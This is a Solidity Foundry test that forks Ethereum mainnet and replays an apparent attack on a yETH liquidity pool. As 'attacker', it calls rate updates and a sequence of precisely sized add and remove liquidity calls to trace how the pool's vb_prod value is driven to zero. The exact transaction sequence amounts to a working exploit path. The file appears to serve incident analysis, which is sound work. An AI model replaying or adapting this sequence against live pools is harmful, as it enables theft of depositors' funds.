// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {IPool} from "./interfaces/IPool.sol";
import "forge-std/Test.sol";

/**
 * @title DeepTrace
 * @notice Deep trace to find exactly where vb_prod becomes 0
 */
contract DeepTraceTest is Test {
    IPool public localPool;
    IPool public constant POOL = IPool(0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81);
    IERC20 public constant YETH = IERC20(0x1BED97CBC3c24A4fb5C069C6E311a967386131f7);

    function setUp() public virtual {
        uint256 _blockNumber = 23914085;
        vm.selectFork(vm.createFork(vm.envString("ETH_RPC_URL"), _blockNumber));

        address[] memory _assets = new address[](8);
        _assets[0] = 0xac3E018457B222d93114458476f3E3416Abbe38F;
        _assets[1] = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
        _assets[2] = 0xA35b1B31Ce002FBF2058D22F30f95D405200A15b;
        _assets[3] = 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704;
        _assets[4] = 0xae78736Cd615f374D3085123A210448E74Fc6393;
        _assets[5] = 0x9Ba021B0a9b958B5E75cE9f6dff97C7eE52cb3E6;
        _assets[6] = 0xDcEe70654261AF21C44c093C300eD3Bb97b78192;
        _assets[7] = 0xd5F7838F5C461fefF7FE49ea5ebaF7728bB0ADfa;

        address[] memory _rateProviders = new address[](8);
        for (uint i = 0; i < 8; i++) {
            _rateProviders[i] = 0x5a7CbC89d543399743D7c4b4a21110b19c6208AE;
        }

        uint256[] memory _weights = new uint256[](8);
        _weights[0] = 200000000000000000;
        _weights[1] = 200000000000000000;
        _weights[2] = 100000000000000000;
        _weights[3] = 100000000000000000;
        _weights[4] = 100000000000000000;
        _weights[5] = 250000000000000000;
        _weights[6] = 25000000000000000;
        _weights[7] = 25000000000000000;

        localPool = IPool(deployCode("Pool", abi.encode(
            address(YETH),
            450000000000000000000,
            _assets,
            _rateProviders,
            _weights
        )));

        vm.etch(address(POOL), address(localPool).code);
    }

    function test_deep_trace() public {
        address attacker = address(69);
        vm.startPrank(attacker);

        for (uint256 i = 0; i < 8; i++) {
            address asset = POOL.assets(i);
            deal(asset, attacker, 100_000e18);
            IERC20(asset).approve(address(POOL), type(uint256).max);
        }

        uint256[] memory rates = new uint256[](8);
        rates[0] = 0; rates[1] = 1; rates[2] = 2; rates[3] = 3;
        rates[4] = 4; rates[5] = 5; rates[6] = 0; rates[7] = 0;
        POOL.update_rates(rates);

        uint256 firstRemoveYeth = 416373487230773958294;
        deal(address(YETH), attacker, firstRemoveYeth);
        YETH.approve(address(POOL), type(uint256).max);
        POOL.remove_liquidity(firstRemoveYeth, new uint256[](8), attacker);

        uint256[] memory addAmounts = new uint256[](8);

        // Add 1
        addAmounts[0] = 610669608721347951666;
        addAmounts[1] = 777507145787198969404;
        addAmounts[2] = 563973440562370010057;
        addAmounts[3] = 0;
        addAmounts[4] = 476460390272167461711;
        addAmounts[5] = 0;
        addAmounts[6] = 0;
        addAmounts[7] = 0;
        POOL.add_liquidity(addAmounts, 0, attacker);
        POOL.remove_liquidity(2789348310901989968648, new uint256[](8), attacker);

        // Add 2
        addAmounts[0] = 1636245238220874001286;
        addAmounts[1] = 1531136279659070868194;
        addAmounts[2] = 1041815511903532551187;
        addAmounts[3] = 0;
        addAmounts[4] = 991050908418104947336;
        addAmounts[5] = 1346008005663580090716;
        addAmounts[6] = 0;
        addAmounts[7] = 0;
        POOL.add_liquidity(addAmounts, 0, attacker);
        POOL.remove_liquidity(7379203011929903830039, new uint256[](8), attacker);

        // Add 3
        addAmounts[0] = 1630811661792970363090;
        addAmounts[1] = 1526051744772289698092;
        addAmounts[2] = 1038108768586660585581;
        addAmounts[3] = 0;
        addAmounts[4] = 969651157511131341121;
        addAmounts[5] = 1363135138655820584263;
        addAmounts[6] = 0;
        addAmounts[7] = 0;
        POOL.add_liquidity(addAmounts, 0, attacker);
        POOL.remove_liquidity(7066638371690257003757, new uint256[](8), attacker);

        // Add 4
        addAmounts[0] = 859805263416698094503;
        addAmounts[1] = 804573178584505833740;
        addAmounts[2] = 546933182262586953508;
        addAmounts[3] = 0;
        addAmounts[4] = 510865922059584325991;
        addAmounts[5] = 723182384178548055243;
        addAmounts[6] = 0;
        addAmounts[7] = 0;
        POOL.add_liquidity(addAmounts, 0, attacker);
        POOL.remove_liquidity(3496158478994807127953, new uint256[](8), attacker);

        // Now get state BEFORE add 5
        (uint256 prod_before, uint256 sum_before) = POOL.vb_prod_sum();
        uint256 supply_before = POOL.supply();

        console.log("=== STATE BEFORE 5th ADD_LIQUIDITY ===");
        console.log("vb_prod:", prod_before);
        console.log("vb_sum:", sum_before);
        console.log("supply:", supply_before);
        console.log("");

        console.log("Virtual balances BEFORE:");
        for (uint256 i = 0; i < 8; i++) {
            console.log("  Asset", i, ":", POOL.virtual_balance(i));
        }
        console.log("");

        // Add 5 - THE CRITICAL ONE
        addAmounts[0] = 1784169320136805803209;
        addAmounts[1] = 1669558029141448703194;
        addAmounts[2] = 1135991585797559066395;
        addAmounts[3] = 0;
        addAmounts[4] = 1061079136814511050837;
        addAmounts[5] = 1488254960317842892500;
        addAmounts[6] = 0;
        addAmounts[7] = 0;

        console.log("Adding amounts:");
        for (uint256 i = 0; i < 8; i++) {
            if (addAmounts[i] > 0) {
                console.log("  Asset", i, ":", addAmounts[i]);
            }
        }
        console.log("");

        // Calculate what the new vb_sum would be (approximately)
        // This helps us understand the scale of change

        POOL.add_liquidity(addAmounts, 0, attacker);

        (uint256 prod_after, uint256 sum_after) = POOL.vb_prod_sum();
        uint256 supply_after = POOL.supply();

        console.log("=== STATE AFTER 5th ADD_LIQUIDITY ===");
        console.log("vb_prod:", prod_after);
        console.log("vb_sum:", sum_after);
        console.log("supply:", supply_after);
        console.log("");

        console.log("Virtual balances AFTER:");
        for (uint256 i = 0; i < 8; i++) {
            console.log("  Asset", i, ":", POOL.virtual_balance(i));
        }
        console.log("");

        console.log("=== ANALYSIS ===");
        console.log("vb_prod went from", prod_before, "to", prod_after);
        console.log("vb_sum went from", sum_before, "to", sum_after);
        console.log("supply went from", supply_before, "to", supply_after);

        if (prod_after == 0) {
            console.log("");
            console.log(">>> vb_prod BECAME 0! <<<");
            console.log("");

            // Calculate ratios for assets that were added to
            console.log("Analyzing why...");
            console.log("");
            console.log("The vb_prod update in add_liquidity (line 474) does:");
            console.log("  vb_prod = vb_prod * pow_up(prev_vb/vb, wn) / PRECISION");
            console.log("");
            console.log("For each asset added, prev_vb/vb < 1, which shrinks vb_prod.");
            console.log("With 5 assets being added simultaneously, the cumulative");
            console.log("effect of multiplying by (prev_vb/vb)^wn for each asset");
            console.log("can drive vb_prod to 0.");
        }
    }
}
